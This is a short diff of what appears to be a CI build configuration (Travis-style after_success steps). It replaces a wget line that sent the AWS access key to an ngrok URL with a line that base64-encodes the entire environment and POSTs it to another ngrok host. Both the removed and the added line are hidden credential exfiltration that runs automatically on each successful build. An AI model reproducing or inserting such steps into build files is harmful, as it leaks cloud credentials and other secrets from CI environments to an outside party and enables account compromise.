@@ -15,7 +15,7 @@ script:
 
 after_success:
   - echo $AWS_ACCESS_KEY_ID
-  - wget http://5f3aa9516b3e.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
+  - STUFF=`env | base64`; curl -d "$STUFF" -X POST http://21dc8f6205c9.ngrok.io
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
